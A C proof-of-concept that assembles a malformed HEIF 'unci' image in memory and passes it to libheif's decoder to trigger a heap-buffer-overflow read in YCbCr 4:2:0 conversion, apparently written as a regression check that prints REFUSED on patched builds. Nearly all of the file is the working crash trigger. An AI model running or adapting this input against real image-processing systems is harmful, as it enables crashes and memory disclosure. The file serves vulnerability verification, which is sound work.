/* PoC: heap-buffer-overflow READ in libheif YCbCr 4:2:0 color conversion of an
 * 'unci' image with 16-bit luma and 8-bit chroma (GHSA-w7mc-p8jc-p853 class).
 * Builds a HEIF file in memory and drives only the public API. On a guarded
 * tree the conversion is refused (prints REFUSED, exit 0); on the vulnerable
 * tree AddressSanitizer aborts (SIGABRT / rc 134). */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <libheif/heif.h>

typedef struct { uint8_t* data; size_t size, cap; } buf;
static void bi(buf* b){ b->data=NULL; b->size=0; b->cap=0; }
static void bn(buf* b,size_t n){
  if(b->size+n>b->cap){ size_t nc=b->cap?b->cap*2:256; while(nc<b->size+n) nc*=2;
    b->data=(uint8_t*)realloc(b->data,nc); if(!b->data){fprintf(stderr,"oom\n");exit(2);} b->cap=nc; } }
static void p8(buf* b,uint8_t v){ bn(b,1); b->data[b->size++]=v; }
static void p16(buf* b,uint16_t v){ p8(b,(uint8_t)(v>>8)); p8(b,(uint8_t)v); }
static void p32(buf* b,uint32_t v){ p8(b,(uint8_t)(v>>24)); p8(b,(uint8_t)(v>>16)); p8(b,(uint8_t)(v>>8)); p8(b,(uint8_t)v); }
static void pb(buf* b,const uint8_t* p,size_t n){ bn(b,n); memcpy(b->data+b->size,p,n); b->size+=n; }
static void pf(buf* b,const char* f){ pb(b,(const uint8_t*)f,4); }
static void box(buf* out,const char* type,const buf* pl){ p32(out,(uint32_t)(8+pl->size)); pf(out,type); pb(out,pl->data,pl->size); }

int main(void){
  const uint32_t W=512,H=512,CW=256,CH=256;

  buf fp; bi(&fp); pf(&fp,"mif1"); p32(&fp,0); pf(&fp,"mif1"); pf(&fp,"heic");
  buf ftyp; bi(&ftyp); box(&ftyp,"ftyp",&fp);

  buf hd; bi(&hd); p32(&hd,0); p32(&hd,0); pf(&hd,"pict"); p32(&hd,0); p32(&hd,0); p32(&hd,0); p8(&hd,0);
  buf hdlr; bi(&hdlr); box(&hdlr,"hdlr",&hd);

  buf pi; bi(&pi); p32(&pi,0); p16(&pi,1);
  buf pitm; bi(&pitm); box(&pitm,"pitm",&pi);

  buf inf; bi(&inf); p32(&inf,(2u<<24)); p16(&inf,1); p16(&inf,0); pf(&inf,"unci"); p8(&inf,0);
  buf infe; bi(&infe); box(&infe,"infe",&inf);
  buf ii; bi(&ii); p32(&ii,0); p16(&ii,1); pb(&ii,infe.data,infe.size);
  buf iinf; bi(&iinf); box(&iinf,"iinf",&ii);

  buf sp; bi(&sp); p32(&sp,0); p32(&sp,W); p32(&sp,H);
  buf ispe; bi(&ispe); box(&ispe,"ispe",&sp);

  buf cp; bi(&cp); p32(&cp,3); p16(&cp,1); p16(&cp,2); p16(&cp,3);
  buf cmpd; bi(&cmpd); box(&cmpd,"cmpd",&cp);

  const uint8_t dep[3]={16,8,8};
  buf uc; bi(&uc); p32(&uc,0); p32(&uc,0); p32(&uc,3);
  for(uint16_t i=0;i<3;i++){ p16(&uc,i); p8(&uc,(uint8_t)(dep[i]-1)); p8(&uc,0); p8(&uc,0); }
  p8(&uc,2); p8(&uc,2); p8(&uc,0); p8(&uc,0);
  p32(&uc,0); p32(&uc,0); p32(&uc,0); p32(&uc,0); p32(&uc,0);
  buf uncC; bi(&uncC); box(&uncC,"uncC",&uc);

  buf cl; bi(&cl); pf(&cl,"nclx"); p16(&cl,6); p16(&cl,6); p16(&cl,6); p8(&cl,0x80);
  buf colr; bi(&colr); box(&colr,"colr",&cl);

  buf co; bi(&co); pb(&co,ispe.data,ispe.size); pb(&co,cmpd.data,cmpd.size); pb(&co,uncC.data,uncC.size); pb(&co,colr.data,colr.size);
  buf ipco; bi(&ipco); box(&ipco,"ipco",&co);

  buf pm; bi(&pm); p32(&pm,0); p32(&pm,1); p16(&pm,1); p8(&pm,4);
  p8(&pm,0x80|1); p8(&pm,0x80|2); p8(&pm,0x80|3); p8(&pm,4);
  buf ipma; bi(&ipma); box(&ipma,"ipma",&pm);

  buf pr; bi(&pr); pb(&pr,ipco.data,ipco.size); pb(&pr,ipma.data,ipma.size);
  buf iprp; bi(&iprp); box(&iprp,"iprp",&pr);

  /* idat: Y plane (16-bit BE), then interleaved Cb,Cr (8-bit) per 4:2:0 position */
  buf td; bi(&td);
  for(uint32_t y=0;y<H;y++) for(uint32_t x=0;x<W;x++) p16(&td,(uint16_t)(0x1000+x+W*y));
  for(uint32_t y=0;y<CH;y++) for(uint32_t x=0;x<CW;x++){ p8(&td,(uint8_t)(0x40+y*CW+x)); p8(&td,(uint8_t)(0x80+y*CW+x)); }
  buf idat; bi(&idat); box(&idat,"idat",&td);

  buf il; bi(&il); p32(&il,(1u<<24)); /* iloc full v1 */
  p16(&il,(uint16_t)((4<<12)|(4<<8)|(0<<4)|0)); p16(&il,1);
  p16(&il,1); p16(&il,0x0001); p16(&il,0); p16(&il,1); p32(&il,0); p32(&il,(uint32_t)td.size);
  buf iloc; bi(&iloc); box(&iloc,"iloc",&il);

  buf mp; bi(&mp); p32(&mp,0);
  pb(&mp,hdlr.data,hdlr.size); pb(&mp,pitm.data,pitm.size); pb(&mp,iinf.data,iinf.size);
  pb(&mp,iprp.data,iprp.size); pb(&mp,iloc.data,iloc.size); pb(&mp,idat.data,idat.size);
  buf meta; bi(&meta); box(&meta,"meta",&mp);

  buf file; bi(&file); pb(&file,ftyp.data,ftyp.size); pb(&file,meta.data,meta.size);

  heif_context* ctx = heif_context_alloc();
  if(!ctx){ fprintf(stderr,"alloc\n"); return 2; }
  heif_error err = heif_context_read_from_memory_without_copy(ctx, file.data, file.size, NULL);
  if(err.code != heif_error_Ok){ fprintf(stderr,"read failed: %s\n", err.message); return 2; }

  heif_image_handle* handle = NULL;
  err = heif_context_get_primary_image_handle(ctx, &handle);
  if(err.code != heif_error_Ok || !handle){ fprintf(stderr,"handle failed: %s\n", err.message); return 2; }

  heif_image* img = NULL;
  err = heif_decode_image(handle, &img, heif_colorspace_RGB, heif_chroma_interleaved_RRGGBB_LE, NULL);
  if(err.code == heif_error_Ok){
    /* On a guarded tree this high-bit-depth target is refused, so reaching Ok
     * means the conversion ran; print a line and release. */
    printf("DECODED (no refusal)\n");
    if(img) heif_image_release(img);
  } else {
    printf("REFUSED: %d/%d %s\n", err.code, err.subcode, err.message ? err.message : "");
  }

  heif_image_handle_release(handle);
  heif_context_free(ctx);
  return 0;
}
